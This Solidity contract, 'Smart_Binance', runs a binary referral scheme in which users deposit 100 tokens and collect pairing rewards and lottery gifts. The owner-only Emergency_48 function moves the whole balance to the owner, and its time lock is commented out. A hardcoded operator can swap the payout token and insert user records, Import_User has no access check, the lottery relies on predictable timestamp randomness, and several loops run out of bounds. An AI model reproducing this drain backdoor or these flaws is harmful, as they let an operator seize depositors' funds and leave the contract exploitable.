// SPDX-License-Identifier: Unlicensed
pragma solidity >=0.4.22 <0.9.0;
import "./Smart_Binary.sol";
contract Smart_Binance is Context {
    using SafeERC20 for IERC20; struct Node {
    uint32 LD; uint32 RD; uint32 TCP; uint256 DP; uint8 CH; uint8 OR; address UPA; address LDA; address RDA; }
    mapping(address => Node) private _users;
    mapping(uint256 => address) private ALUSA;
    address private owner;
    address[] private CNDA;
    mapping(uint256 => address) private _DuP;
    address[] private _PYLst;
    uint256 private _userId;
    uint256 private _Chck_AdId;
    uint256 private _DuPId;
    uint256 private lstRn;
    uint256 private lstRnSMG;
    uint64 private _cnt_SMG_CNDA;
    uint64 private _cnt_PYLst;
    uint256 private VL_SMG;
    uint256[] private _rndNums; 
    uint8 private Lock;
    uint8 private Count_Old_User;
    uint8 Check_Gift;
    IERC20 private S_Coin;
    string private Note;
    string private NFT_Site;
    Smart_Binary private Nobj;
    constructor() {owner = _msgSender();
        lstRn = block.timestamp;
        S_Coin = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
        Nobj = Smart_Binary(0x3164B3841D2b603ddB43C909C7f6Efd787058541); }
    function Reward_12() public {require(Lock == 0, "Proccesing");
            require( _users[_msgSender()].TCP > 0, "You Dont Have Any Point Today" );
            // require( block.timestamp > lstRn + 12 hours, "Reward_12 Time Has Not Come" );
            Lock = 1;
            uint256 V_Rwd = (PRP() * 90) - (Total_Point() * 10**18); VL_SMG = (PRP() * 10);
            uint256 V_Pnt = ((V_Rwd)) / Total_Point();
            uint256 RwdCl = (Total_Point()) * 10**18;
        for(uint256 i = 0; i <= _userId; i = unsafe_inc(i)) { Node memory TMPNDE = _users[ALUSA[i]];
            uint32 Pnt; uint32 Result = TMPNDE.LD <= TMPNDE.RD ? TMPNDE.LD : TMPNDE.RD;
            if (Result > 0) { if (Result > 25) { Pnt = 25;
            if (TMPNDE.LD < Result) { TMPNDE.LD = 0; TMPNDE.RD -= Result; } 
            else if (TMPNDE.RD < Result) { TMPNDE.LD -= Result; TMPNDE.RD = 0; } 
            else {TMPNDE.LD -= Result; TMPNDE.RD -= Result; } } 
            else {Pnt = Result; 
            if (TMPNDE.LD < Pnt) { TMPNDE.LD = 0; TMPNDE.RD -= Pnt; } 
            else if (TMPNDE.RD < Pnt) { TMPNDE.LD -= Pnt; TMPNDE.RD = 0; } 
            else { TMPNDE.LD -= Pnt; TMPNDE.RD -= Pnt;}} TMPNDE.TCP = 0; _users[ALUSA[i]] = TMPNDE;
            if ( Pnt * V_Pnt > S_Coin.balanceOf(address(this))) { S_Coin.safeTransfer(ALUSA[i],S_Coin.balanceOf(address(this))); } 
            else { S_Coin.safeTransfer( ALUSA[i], Pnt * V_Pnt);}}
            _PYLst.push(ALUSA[i]); _cnt_PYLst++; } lstRn = block.timestamp;
            if (RwdCl <= S_Coin.balanceOf(address(this))) { S_Coin.safeTransfer(_msgSender(), RwdCl);}
            Lock = 0; Check_Gift = 1; lstRnSMG = block.timestamp;}
    function Register(address upline) public {
            require( _users[upline].CH != 2,"Upline Has Two Directs!" );
            require( _msgSender() != upline, "You Can Not Enter Your Address!");
            bool TsUs = false;
        for(uint256 i = 0; i <= _userId; i = unsafe_inc(i)) {
            if (ALUSA[i] == _msgSender()) { TsUs = true; break; } }
            require(TsUs == false, "You Were Registered!");
            bool TSUP = false;
        for(uint256 i = 0; i <= _userId; i = unsafe_inc(i)) {
            if (ALUSA[i] == upline) { TSUP = true; break;}}
            require(TSUP == true, "Upline Is Not Exist!");
            S_Coin.safeTransferFrom( _msgSender(), address(this), 100 * 10**18 ); ALUSA[_userId] = _msgSender(); _userId++;
            uint256 DPCh = _users[upline].DP + 1; _users[_msgSender()] = Node(
            0, 0, 0, DPCh, 0, _users[upline].CH, upline, address(0), address(0) );
            if (_users[upline].CH == 0) { _users[upline].LD++; _users[upline].LDA = _msgSender(); } 
            else {_users[upline].RD++; _users[upline].RDA = _msgSender(); } _users[upline].CH++; setTDP(upline);
            address UPN = _users[upline].UPA;  address ChNde = upline;
        for( uint256 j = 0; j < _users[upline].DP; j = unsafe_inc(j)) 
            { if (_users[ChNde].OR == 0) { _users[UPN].LD++; } 
            else { _users[UPN].RD++; } setTDP(UPN); ChNde = UPN; UPN = _users[UPN].UPA; } }
    function Gift_3() public {           
            require(Check_Gift == 1,"Gift Time Has Not Come!" );
            require( block.timestamp > lstRnSMG + 3 hours, "Gift_3 Time Has Not Come" );
            require(VL_SMG > 20*10**18, "Gift Balance Is not Enough!" );
            require(_cnt_SMG_CNDA > 0, "There is No Candidate!" );
            bool TsUsSMG = false;
        for(uint256 i = 0; i <= _cnt_SMG_CNDA; i = unsafe_inc(i)) {
            if (CNDA[i] == _msgSender()) { TsUsSMG = true; break; } }
            require(TsUsSMG == true, "You Are Not Candidated!"); S_Coin.safeTransfer(_msgSender(),10 * 10**18 );
            uint256 Num_Win = ((VL_SMG - 10*10**18) / 10**18) / 10;
            if (Num_Win != 0 && _cnt_SMG_CNDA != 0) {
            if (_cnt_SMG_CNDA > Num_Win) {
        for(uint256 i = 1; i <= _cnt_SMG_CNDA; i = unsafe_inc(i) ) {_rndNums.push(i); }
        for(uint256 i = 1; i <= Num_Win; i = unsafe_inc(i)) {
            uint256 randomIndex = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender, i))) % _cnt_SMG_CNDA;
            uint256 rsltNumb = _rndNums[randomIndex]; _rndNums[randomIndex] = _rndNums[ _rndNums.length - 1 ]; _rndNums.pop();
            if(_users[CNDA[rsltNumb - 1]].TCP == 0){ S_Coin.safeTransfer(CNDA[rsltNumb - 1], 10 * 10**18 ); } }
        for( uint256 i = 0; i < (_cnt_SMG_CNDA - Num_Win); i = unsafe_inc(i)) {_rndNums.pop(); } } 
            else { for ( uint256 i = 0; i < _cnt_SMG_CNDA; i = unsafe_inc(i))
            { S_Coin.safeTransfer(CNDA[i], 10 * 10**18 );}}} delete _cnt_SMG_CNDA; _cnt_SMG_CNDA = 0;
             VL_SMG = 0; Check_Gift = 0; delete _PYLst;_cnt_PYLst=0;}
    function Smart_Gift() public {
            require(Check_Gift == 1,"Gift Time Has Not Come!" );
            bool TsUsPY = false;
            for(uint256 i = 0; i <= _cnt_PYLst; i = unsafe_inc(i)) {
                if (_PYLst[i] == _msgSender()) { TsUsPY = true; break; } }
            require(TsUsPY == false, "You Get Point!");
            bool TsUs = false;
            for(uint256 i = 0; i <= _userId; i = unsafe_inc(i)) {
                if (ALUSA[i] == _msgSender()) { TsUs = true; break; } }
            require(TsUs == true, "You Are Not In Smart Binance Contract!" );
            bool TsUsSMG = false;
            for(uint256 i = 0; i <= _cnt_SMG_CNDA; i = unsafe_inc(i)) {
                if (CNDA[i] == _msgSender()) { TsUsSMG = true; break; } }
            require(TsUsSMG == false, "You Were Candidated!");
            require(((((VL_SMG - 10*10**18) / 10**18) / 10)*2) >= (_cnt_SMG_CNDA++), "The capacity is completed!");
            CNDA.push(_msgSender()); _cnt_SMG_CNDA++; }
    function Emergency_48() public {require(_msgSender() == owner, "You Can not Run This Order!");
        // require(block.timestamp > lstRn + 48 hours, "Emergency_48 Time Has Not Come" );
        S_Coin.safeTransfer(owner, S_Coin.balanceOf(address(this)) ); }
    function Import_User (address UserAddress ) public {
        bool TsUs = false;
        for(uint256 i = 0; i <= _userId; i = unsafe_inc(i)) {
            if (ALUSA[i] == UserAddress) { TsUs = true; break; } }
            require(TsUs == false, "You Were Registered!");
            bool tsUsDuP = false;
        for(uint256 i = 0; i <= _DuPId; i = unsafe_inc(i)) {
        if (_DuP[i] == UserAddress) { tsUsDuP = true; break; } }
        require(tsUsDuP == false, "You Were Registered!");
        ALUSA[_userId] = UserAddress;  _users[ALUSA[_userId]] = Node( 
        uint32(Nobj.User_Information(UserAddress).leftDirect),
        uint32(Nobj.User_Information(UserAddress).rightDirect),
          0 , Nobj.User_Information(UserAddress).depth,
        uint8(Nobj.User_Information(UserAddress).childs),
        uint8(Nobj.User_Information(UserAddress).leftOrrightUpline),
        Nobj.User_Information(UserAddress).UplineAddress,
        Nobj.User_Information(UserAddress).leftDirectAddress,
        Nobj.User_Information(UserAddress).rightDirectAddress ); _userId++; }
    function Upload_User (
        address user, uint32 L, uint32 R, uint256 DeP, uint8 CHs, uint8 LoR, address UAd, address LAd, address RAd ) 
        public { require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just Operator Can Write!");
        require(Count_Old_User <= 99, "Upload_User is over!"); ALUSA[_userId] = user; _users[ALUSA[_userId]] 
        = Node( L, R, 0, DeP, CHs, LoR, UAd, LAd, RAd ); _userId++; Count_Old_User++; }
    function Change_S_Coin(address add) public{
        require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just Operator Can Write!");
        S_Coin = IERC20(add);}
    function PRP() private view returns (uint256) { return Contract_Balance() / 100; }
    function setTDP(address userAddress) private { 
        uint32 min = _users[userAddress].LD <= _users[userAddress].RD ? _users[userAddress].LD : _users[userAddress].RD;
    if (min > 0) { _users[userAddress].TCP = min; } }
    function unsafe_inc(uint256 x) private pure returns (uint256) { unchecked { return x + 1; } }
    function Add_DuP(address add) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just Operator Can Write!"); _DuP[_DuPId] = add; _DuPId++;}
    function Write_Note(string memory N) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just Operator Can Write!"); Note = N; }
    function Write_NFT_Site(string memory N) public {require(_msgSender() == 0xF9B29B8853c98B68c19f53F5b39e69eF6eAF1e2c, "Just Operator Can Write!"); NFT_Site = N; }
    function User_Info(address UserAddress) public view returns (Node memory) {return _users[UserAddress]; }
    function Contract_Balance() public view returns (uint256) { 
        return (S_Coin.balanceOf(address(this)) - VL_SMG) / 10**18; }
    function Reward_12_Writer () public view returns (uint256) { return Total_Point(); }
    function Reward_Balance () public view returns (uint256) { return (PRP() * 90) / 10**18; }
    function Gift_Balance() public view returns (uint256) { return (PRP() * 10) / 10**18; }
    function Gift_Candidate() public view returns (uint256) { return _cnt_SMG_CNDA; }
    function Total_Register() public view returns (uint256) { return _userId; }
    function User_Upline(address Add_Address) public view returns (address) { return _users[Add_Address].UPA; }
    function User_Directs(address Add_Address) public view returns (address, address) { return (_users[Add_Address].LDA, _users[Add_Address].RDA ); }
    function User_Left_Right(address Add_Address) public view returns (uint256, uint256) { return ( _users[Add_Address].LD, _users[Add_Address].RD ); }
    function Total_Point () public view returns (uint256) { uint256 TPnt; for (uint256 i = 0; i <= _userId; i = unsafe_inc(i)) { uint32 min = _users[ALUSA[i]].LD <=
    _users[ALUSA[i]].RD ? _users[ALUSA[i]].LD : _users[ALUSA[i]].RD; if (min > 25) { min = 25; } TPnt += min; } return TPnt; }
    function Value_Point() public view returns (uint256) {if (Total_Point() == 0) {return Reward_Balance();} 
    else { return ((PRP() * 90) - (Total_Point())) / (Total_Point() * 10**18);}}
    function Read_Note() public view returns (string memory) { return Note; }
    function Read_NFT_Site() public view returns (string memory) { return NFT_Site; } 
    function User_Income(address Add_Address) public view returns (uint256){ return Value_Point() * _users[Add_Address].TCP;}
    function Gift_3_Writer() public view returns (uint256){ if(VL_SMG > 20*10**18){ return 10; } else{ return 0; } } }